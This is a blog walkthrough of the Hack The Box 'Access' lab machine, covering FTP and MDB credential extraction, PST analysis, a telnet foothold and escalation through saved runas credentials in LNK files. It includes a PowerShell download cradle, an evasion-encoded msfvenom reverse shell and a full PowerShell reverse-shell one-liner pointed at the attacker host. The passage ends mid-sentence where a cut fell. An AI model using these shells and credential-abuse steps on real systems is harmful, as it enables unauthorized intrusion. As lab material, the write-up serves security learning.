+++
title = "Access HTB Walkthrough: PST Files, LNK Exploitation, and Stored Credentials"
draft = false
tags = ["Windows", "HTB", "Hack The Box", "PST Files", "LNK Files", "Telnet", "Active Directory", "Stored Credentials", "Windows Security", "Privilege Escalation", "FTP", "Microsoft Access", "Database Security"]
keywords = ["Hack The Box Access", "Windows stored credentials exploitation", "PST file analysis", "LNK file vulnerabilities", "runas savecred exploitation", "Windows privilege escalation", "Microsoft Access database security", "telnet enumeration", "FTP anonymous access", "Windows security assessment"]
description = "A comprehensive walkthrough of the Access machine from Hack The Box, covering PST file analysis, LNK file exploitation, and stored credential attacks. Learn about Windows security mechanisms, database enumeration, and privilege escalation techniques using saved credentials."
author = "bloodstiller"
date = 2024-09-12
toc = true
bold = true
next = true
lastmod = 2024-09-12
+++


## Access Hack The Box Walkthrough/Writeup: {#name-of-box-access-htb-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Access>

## How I use variables &amp; wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)

## 1. Enumeration: {#1-dot-enumeration}


### Simple NMAP to get a view of low hanging fruit: {#simple-nmap-to-get-a-view-of-low-hanging-fruit}

```shell
kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
🕙 19:30:03 zsh ❯ nmap $box -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 19:30 BST
Nmap scan report for 10.129.199.196
Host is up (0.056s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds
```

-   {{< figure src="/ox-hugo/2024-09-09-193422_.png" >}}


### Advanced All Ports NMAP Scan: {#advanced-all-ports-nmap-scan}

```shell
kali in 46-Boxes/46.02-HTB/Access/scans/nmap  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
🕙 19:29:41 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP $box
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 19:30 BST
Nmap scan report for 10.129.199.196
Host is up (0.040s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 382.99 seconds

```

-   We can see that so far it's just the 3 services running, `FTP`, `telnet` &amp; `HTTP` &amp; that the system is mostly likely running windows 8


### HTTP Enumeration: {#http-enumeration}

-   I run feroxbuster on the domain but the results are slim.
    -   The page also appears to be a simple holding page.
    -   {{< figure src="/ox-hugo/2024-09-10-113901_.png" >}}


### Telnet Enumeration: {#telnet-enumeration}

-   Telnet Enumeration:

    -   Not really much here to be honest.

    <!--listend-->

    ```shell
    kali in 46-Boxes/46.02-HTB/Access/scans/nmap  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 19:31:45 zsh ❯ nmap -n -sV -Pn --script "*telnet* and safe" -p 23 $box -oA telnetScan
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 09:54 BST
    Stats: 0:02:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
    Service scan Timing: About 0.00% done
    Nmap scan report for 10.129.199.196
    Host is up (0.036s latency).

    PORT   STATE SERVICE VERSION
    23/tcp open  telnet?

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 176.99 seconds


    ```


### FTP Enumeration: {#ftp-enumeration}

-   I connect via FTP and can see there are shares available.
    -   {{< figure src="/ox-hugo/2024-09-09-193527_.png" >}}


### Backups Share Enumeration: {#backups-share-enumeration}

-   I can see in the `Backups` share there is a file called `backup.mdb`

    > An MDB file is a database file created by Microsoft Access, a widely-used desktop relational database program. It contains the database structure (tables and fields) and database entries (table rows). MDB files may also store data entry forms, queries, stored procedures, reports, and database security settings.
    >
    > More Information

    -   **So this could be good as it could contain creds etc**:
        -   It's been replaced by the newer `.accdb` format. It could include basic password protection but the format lacks advanced encryption, making it less secure than newer formats.

-   **I try and download it using netexec, but it loses it's damn-mind**:
    -   I figured I'd try netexec's ftp download method, but that's what I get for trying something new I suppose.
    -   {{< figure src="/ox-hugo/2024-09-09-193929_.png" >}}

-   **I then continue to have consistent issues with Passive mode**:
    -   However there is a way around this and you can just download all of the data at once using wget:
        -   **Command**: wget -m &#x2013;no-passive <ftp://anonymous:anonymous@$box>
        -   {{< figure src="/ox-hugo/2024-09-09-195011_.png" >}}


### `backup.mdb` enumeration: {#backup-dot-mdb-enumeration}

-   **I run strings on the file and can see some interesting things like potential usernames/fields**:
    -   {{< figure src="/ox-hugo/2024-09-09-195259_.png" >}}

-   I tried to open the file with dbeaver but for some reason it would not display correctly.

-   **There is luckily a probject called `mdbtools` we can use**:
    -   <https://github.com/mdbtools/mdbtools>
    -   `sudo apt install mdbtools`

-   **Find out how many tables &amp; their names**:
    -   {{< figure src="/ox-hugo/2024-09-09-200827_.png" >}}
        -   As we can see there is an entry called `auth_user`

-   **I dump this entry &amp; get 3 lots of creds**:
    -   {{< figure src="/ox-hugo/2024-09-09-200924_.png" >}}

-   So we have 3 sets of creds, lets take a look at the other services share:

<!--listend-->

-   **Alt options**:
    -   I find the website: <https://www.mdbopener.com/> which let you upload the file &amp; have it extract all the tables to `.csv` files.
    -   +Note+: I WOULD NEVER DO THIS OR SUGGEST THIS ON AN ENGAGEMENT!!!!
        -   But this is an option for this challenge/box. (I chose not too as I want to make it as close to life as possible for me)


### Engineer Share Enumeration: {#engineer-share-enumeration}

-   There is a `.zip` file in here called `Access Control.zip`

-   **I try and unzip but I am denied as it has access control on it which means password protection**
    -   {{< figure src="/ox-hugo/2024-09-09-201528_.png" >}}

-   **I run file on it to ensure it's actually a `.zip` &amp; it is, encrypted with AES**.
    -   {{< figure src="/ox-hugo/2024-09-09-201620_.png" >}}

-   **I run `zip2john` on it to generate a hash**.
    -   {{< figure src="/ox-hugo/2024-09-09-201705_.png" >}}

-   **I run it through rockyou but get no hits**.
    -   {{< figure src="/ox-hugo/2024-09-09-201754_.png" >}}

-   **I extract it in my gui and use one of the passwords I extracted from the** `.mdb` **&amp; it works**!
    -   I am given a file called `Access Control.pst`


### Viewing Contents of the `.pst` file: {#viewing-contents-of-the-dot-pst-file}

-   **What is a** `.pst`:

> A PST file is a data storage file that contains personal information used by Microsoft Outlook and Exchange. It may also include e-mail folders, contacts, addresses, and other data.

-   So this could hold even more valuable information!

-   **I switch to my Windows VM and download this software so I can view the contents of the** `.pst`:
    -   <https://www.ostpstviewer.com/download.aspx>

-   **Once imported, I find a single email which contains a password for the `security` user:**
    -   {{< figure src="/ox-hugo/2024-09-10-113130_.png" >}}


## 2. Foothold: {#2-dot-foothold}

-   With the new credentials for `security` I login to the telnet server
    -   {{< figure src="/ox-hugo/2024-09-10-114238_.png" >}}

-   It gives me access to the `C:\` drive of the host.
    -   {{< figure src="/ox-hugo/2024-09-10-114342_.png" >}}


### System Info: {#system-info}

-   I can see the system is actually running `Microsoft Windows Server 2008 R2 Standard`
    -   {{< figure src="/ox-hugo/2024-09-10-115018_.png" >}}


### Shell Upgrade: {#shell-upgrade}

-   Initially I try and run powershell but it crashes.
    -   {{< figure src="/ox-hugo/2024-09-10-115727_.png" >}}
-   Telnet is trash, well it's not as we are accessing the host via it, but it's not great to work in. It's slow and doesn't allow us to delete characters. Lets upgrade our shell.

-   **Future bloodstiller here**:
    -   We can actually get a good powershell session from telnet by doing the following:
        -   `powershell -File -`
        -   {{< figure src="/ox-hugo/2024-09-10-173752_.png" >}}
        -   This was not something I was aware of until I had finished the box &amp; read 0xdf's awesome write-up: <https://0xdf.gitlab.io/2019/03/02/htb-access.html> (i like to read other writeups after I have finished mine to see what I could have done differently and find a different perspective &amp; approach)

<!--listend-->

-   **I start a python server on my attack machine to host my nc.exe binary**:

-   **I execute powershell from CMD &amp; get it to download the `nc.exe` binary**:
    -   `powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.44:9000/shell.exe','C:\Users\Security\shell.exe')"`
        -   {{< figure src="/ox-hugo/2024-09-10-120151_.png" >}}

-   **Start my nc listener on my attack host**:
    -   `nc -nvlp 9999`

-   **Trigger nc on the target to connect back**:
    -   Annnnnnnnnd we are blocked by group policy! Sneaky admins.
        -   {{< figure src="/ox-hugo/2024-09-10-120536_.png" >}}

-   **Lets try a super encoded shell**:
    -   `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=9999 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o newshell1.exe`
        -   **BLOCKED AGAIN!**
            -   {{< figure src="/ox-hugo/2024-09-10-122626_.png" >}}

-   We can assume that anything not on a strict "allow" list is blocked by Group Policy. So let's switch gears and just live off the land with good ol' powershell.

-   **Simple Powershell reverse shell**:
    -   Finally we get a connection with the below, I have this saved into my notes as a goto but if you are unfamiliar you can also generate it with:
        -   <https://www.revshells.com/>
            ```powershell
                powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.44',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            ```
        -   {{< figure src="/ox-hugo/2024-09-10-125803_.png" >}}


### ZTeko Enumeration: {#zteko-enumeration}

-   I find a file folder called `ZKTeco` in the root folder.
    -   {{< figure src="/ox-hugo/2024-09-10-114513_.png" >}}

-   It appears to contain a copy of a program called `ZKAccess3.5`
    -   {{< figure src="/ox-hugo/2024-09-10-114619_.png" >}}

-   A quick search turns up this public exploit:
    -   <https://www.exploit-db.com/exploits/40323>

> Desc: ZKAccess suffers from an elevation of privileges vulnerability
> which can be used by a simple authenticated user that can change the
> executable file with a binary of choice. The vulnerability exist due
> to the improper permissions, with the 'M' flag (Modify) for 'Authenticated Users'
> group.

-   I check the permissions to see if it's vulnerable:
    -   {{< figure src="/ox-hugo/2024-09-10-175706_.png" >}}

-   It's not, we are missing the `"M"` flag for `modify` for any of the users groups.
    -   {{< figure src="/ox-hugo/2024-09-10-175906_.png" >}}
    -   So it appears this is not vulnerable to this specific exploit but I will put a pin in it, incase we can somehow leverage it later on.


### System Enumeration: {#system-enumeration}

-   We need to enumerate more to find a viable privesc path.
-   So WinPeas etc is great but I have been trying to manually enumerate more as a way to get better at living off the land and working with the tools locally. Let's do some standard enumeration and see what we have available.


#### User Privs: {#user-privs}

-   Little in the way of user or group privs:
    -   {{< figure src="/ox-hugo/2024-09-12-055358_.png" >}}


#### Installed Programs: {#installed-programs}

-   I check for installed programs.

<!--listend-->

```powershell
('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*') | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation, InstallDate | Format-Table -AutoSize
```

-   The only thing that jumps out at me is the ZKTeco software again.
    -   {{< figure src="/ox-hugo/2024-09-12-055836_.png" >}}


## 3. Privesc: {#3-dot-privesc}


### cmdkey /list discovery: {#cmdkey-list-discovery}

-   **I run** `cmdkey /list` **&amp; get a hit**:
    -   So we can see that the Administrator has a domain password stored on this machine!
        -   {{< figure src="/ox-hugo/2024-09-10-181320_.png" >}}
    -   `cmdkey /list` displays a list of stored usernames and credentials on the system.
        -   It won't let us actually view the creds however we can start enumerating for files that would use this feature.
        -   Now, we need to figure out what it's actually stored for, as windows may store creds for multiple reasons.


### lnk file enumeration: {#lnk-file-enumeration}

-   One reason that the system may have stored credentials is so that a binary can be run with elevated privileges without the administrator having to enter their credentials every time it runs.

-   A common way to do this is to use the `runas /savecred` switch within a shortcut/lnk file:

-   E.G. create a new `lnk/shorcut` file on windows but make the content the following:
    -   `runas /user:<username> /savecred "Your Executable Here"` this will generate a shortcut file. It will request the credentials for the specified user the first time it's run &amp; store those credentials, but after that it will run in the context of that user every time by using the stored credentials.
        -   The key thing for us as pentesters is this **<span class="underline">Once credentials are saved using `runas /savecred`, any application can be run in the context of that account without re-entering the credentials.</span>**
    -   When these `lnk` files are generated they retain the `runas` string within them and we can enumerate and search for these to find out if this is a viable privesc path:

<!--listend-->

-   **We can enumerate stored `lnk` files by doing the below and checking them for runas as strings**:
    1.  **Generate a list of all `lnk` files on the system**:
        ```powershell
         Get-ChildItem "C:\" *.lnk -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object { $_.FullName } | Out-File lnkFiles.txt
        ```

        -   {{< figure src="/ox-hugo/2024-09-12-065531_.png" >}}
        -   **Command Breakdown**:
            -   `Get-ChildItem "C:\" *.lnk -Recurse -Force -ErrorAction SilentlyContinue`
                -   `Get-ChildItem`: Retrieves a list of items (files and directories) from the specified location.
                -   `"C:\"`: Specifies the root directory of the C:\\ drive to search.
                -   `*.lnk`: Filters the search to only include files with the .lnk extension (shortcut files).
                -   `-Recurse`: Instructs PowerShell to search through all subdirectories of C:\\, not just the top-level directory.
                -   `-Force`: Includes hidden and system files in the search.
                -   `-ErrorAction SilentlyContinue`: Suppresses error messages (like permission denied errors) from being displayed.

            -   `| Where-Object { $_.PSIsContainer -eq $false }`
                -   `|`: Passes the output of Get-ChildItem to the next command in the pipeline.
                -   `Where-Object`: Filters objects passed through the pipeline based on a condition.
                -   `$_`: Represents the current object in the pipeline.
                -   `PSIsContainer -eq $false`: Ensures that only files (not directories) are passed through the pipeline. The PSIsContainer property is true for directories and false for files.

            -   `| ForEach-Object { $_.FullName }`
                -   `|`: Continues passing the filtered files to the next command.
                -   `ForEach-Object { $_.FullName }`: Iterates over each file and extracts the FullName property, which is the complete path to the file.

            -   `| Out-File lnkFiles.txt`
                -   `|`: Pipes the full file paths to the final command.
                -   `Out-File lnkFiles.txt`: Writes the output (the list of full file paths) to the file `lnkFiles.txt`.
    2.  **Loop through the generated list try and read any text stored in the `.lnk` file**:
        ```powershell
           ForEach($file in Get-Content .\lnkFiles.txt) { Write-Output $file; Get-Content $file | Select-String runas -ErrorAction SilentlyContinue }
        ```

        -   **Command Breakdown**:
            -   `ForEach($file in Get-Content .\lnkFiles.txt)`
                -   `ForEach($file in Get-Content .\lnkFiles.txt)`: Loops through each line (representing file paths) in the `lnkFiles.txt` file.
                -   `Get-Content .\lnkFiles.txt`: Reads the contents of `lnkFiles.txt` and treats each line (file path) as an item.
                -   `$file`: Represents the current file path from the loop.

            -   `{ Write-Output $file`;
                -   `Write-Output $file`: Outputs the current file path being processed (for visibility or logging purposes).
                -   \`\`This prints the file path from `lnkFiles.txt` to the console or wherever the output is being redirected.

            -   `Get-Content $file |`
                -   `Get-Content $file`: Reads the content of the file represented by `$file`.
                    -   `$file` is the current file path from the `lnkFiles.txt` file.

            -   `Select-String runas -ErrorAction SilentlyContinue }`
                -   `|`: Pipes the content of the file into the next command.
                -   `Select-String runas`: Searches the file's content for the string `"runas"`.
                    -   If `"runas"` is found, the corresponding line will be output.
                -   `-ErrorAction SilentlyContinue`: Suppresses any errors (e.g., if the file doesn't exist or there are issues reading it).


<!--listend-->

-   **We get a hit!!!**
    -   {{< figure src="/ox-hugo/2024-09-12-072950_.png" >}}
        1.  Tells us it is a `lnk` file for the ZKAccess3.5 binary.
        2.  We can see "`runas.exe`" is being used.
        3.  We can see the parmaters for the lnk file when it was created are:
            -   "`